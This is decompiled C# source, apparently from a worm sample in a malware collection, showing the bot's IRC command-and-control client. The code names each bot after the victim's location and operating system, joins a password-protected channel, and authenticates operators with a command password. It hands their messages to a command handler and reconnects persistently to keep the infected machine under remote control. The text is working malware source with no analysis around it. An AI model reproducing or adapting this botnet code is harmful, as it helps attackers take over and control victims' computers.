// Decompiled with JetBrains decompiler
// Type: explorer.irc
// Assembly: explorer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 56E5CD67-A795-400A-AA93-F7890471D495
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Worm.MSIL.Autorun.ig-2c86700b4d3a736629e63a7f91f6e488e611145530107c5a2b53ad8867079764.exe

using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace explorer
{
  internal class irc
  {
    private TcpClient socket;
    private NetworkStream stream;
    private StreamReader reader;
    private StreamWriter writer;
    private List<string> userList = new List<string>();
    private handler msghanlder;
    public Thread handlerThread;
    public Thread connCheckThread;
    public teller teller;
    public string host;
    public int port;
    public string nick;
    public string user;
    public string realname;

    public void loginUser(string nick, string password)
    {
      if (password == config.cmdPassword)
      {
        if (!this.isLoggedIn(nick))
        {
          this.userList.Add(nick);
          this.teller.tell(config.channel, "Main", config.language_usystem_success_login.Replace("%user%", nick), false, true, false);
        }
        else
          this.teller.tell(config.channel, "Main", config.language_usystem_error_login.Replace("%user%", nick), true, false, false);
      }
      else
        this.teller.tell(config.channel, "Main", config.language_usystem_password_error.Replace("%user%", nick), true, false, false);
    }

    public void logoutUser(string nick)
    {
      if (this.isLoggedIn(nick))
      {
        this.userList.Remove(nick);
        this.teller.tell(config.channel, "Main", config.language_usystem_success_logout.Replace("%user%", nick), false, true, false);
      }
      else
        this.teller.tell(config.channel, "Main", config.language_usystem_error_logout.Replace("%user%", nick), true, false, false);
    }

    public bool isLoggedIn(string nick) => this.userList.Contains(nick);

    public irc(string host, int port, bool makeThread)
    {
      this.host = host;
      this.port = port;
      string newValue = misc.nickGenerator(config.randomLength);
      this.nick = config.nick.Replace("%location%", misc.getLoc()).Replace("%os%", misc.getOS()).Replace("%rand%", newValue);
      this.user = config.user.Replace("%location%", misc.getLoc()).Replace("%os%", misc.getOS()).Replace("%rand%", newValue);
      this.realname = config.realName.Replace("%location%", misc.getLoc()).Replace("%os%", misc.getOS()).Replace("%rand%", newValue);
      this.teller = new teller(this);
      if (!makeThread)
        return;
      this.connect();
    }

    public void setHandler(handler h) => this.msghanlder = h;

    public void connect()
    {
      try
      {
        this.socket = new TcpClient(this.host, this.port);
        this.stream = this.socket.GetStream();
        this.reader = new StreamReader((Stream) this.stream);
        this.writer = new StreamWriter((Stream) this.stream);
        this.createHandlerThread();
        this.createConnCheckThread();
      }
      catch
      {
        int num = config.debug ? 1 : 0;
        this.connect();
      }
    }

    public void createHandlerThread()
    {
      this.handlerThread = new Thread(new ThreadStart(this.handlerThreadfunc));
      this.handlerThread.Start();
    }

    private void handlerThreadfunc()
    {
      this.sendUser(this.user, true, this.realname);
      this.sendNick(this.nick);
      this.sendJoin(config.channel, config.channelpass);
      int num1 = 0;
      try
      {
        string str1;
        while ((str1 = this.reader.ReadLine()) != null)
        {
          ++num1;
          int num2 = config.debug ? 1 : 0;
          if (str1.StartsWith(":"))
          {
            string strSource = str1.Substring(1);
            bool flag = false;
            if (strSource.Contains("372") && strSource.Contains("MOTD"))
              this.sendJoin(config.channel, config.channelpass);
            if (strSource.Contains(" MODE "))
              this.sendJoin(config.channel, config.channelpass);
            if (strSource.Contains("PRIVMSG"))
              strSource = strSource.Substring(0, strSource.IndexOf(" PRIVMSG ") + 9) + misc.GetStringInBetween(" PRIVMSG ", " :", strSource, false, true).ToLower() + strSource.Substring(strSource.IndexOf(" :") + 2);
            if (strSource.Contains("PRIVMSG"))
              flag = true;
            string str2 = " PRIVMSG " + config.channel + " :";
            if (strSource.Contains(str2))
              this.msghanlder.messageReceived(strSource.Substring(strSource.IndexOf(str2) + str2.Length), strSource.Substring(0, strSource.IndexOf("!")), config.channel, this);
            else if (flag)
              this.msghanlder.messageReceived(strSource.Substring(strSource.IndexOf(":") + 1), strSource.Substring(0, strSource.IndexOf("!")), misc.GetStringInBetween(" PRIVMSG ", " :", strSource, false, false), this);
          }
          else if (str1.StartsWith("PING"))
            this.Write("PONG " + str1.Substring(5));
        }
      }
      catch
      {
      }
      this.killConnCheckThread();
      this.connect();
    }

    private void createConnCheckThread()
    {
      this.connCheckThread = new Thread(new ThreadStart(this.connCheckfunc));
      this.connCheckThread.Start();
    }

    private void killConnCheckThread() => this.connCheckThread.Suspend();

    private void connCheckfunc()
    {
      bool flag = true;
      while (flag)
      {
        try
        {
          this.sendPing();
        }
        catch
        {
          flag = false;
        }
        Thread.Sleep(10000);
      }
      try
      {
        this.handlerThread.Suspend();
      }
      catch
      {
      }
      this.connect();
    }

    public void Write(string txt)
    {
      this.writer.WriteLine(txt);
      this.writer.Flush();
      int num = config.debug ? 1 : 0;
    }

    public void sendPrivmsg(string channel, string message) => this.Write("PRIVMSG " + channel + " " + message.Replace(" ", "_"));

    public void sendUser(string user, bool visible, string fullName)
    {
      string str = !visible ? "1" : "0";
      this.Write("USER " + user + " " + str + " * : " + fullName);
    }

    public void sendNick(string nick) => this.Write("NICK " + nick);

    public void sendJoin(string channel) => this.Write("JOIN " + channel);

    public void sendJoin(string channel, string password) => this.Write("JOIN " + channel + " " + password);

    public void sendQuit(string reason) => this.Write("QUIT " + reason);

    public void sendQuit() => this.Write("QUIT");

    public void sendPing() => this.Write("PING " + this.host + ":" + (object) this.port);

    public void sendPing(string data) => this.Write("PING " + data);
  }
}
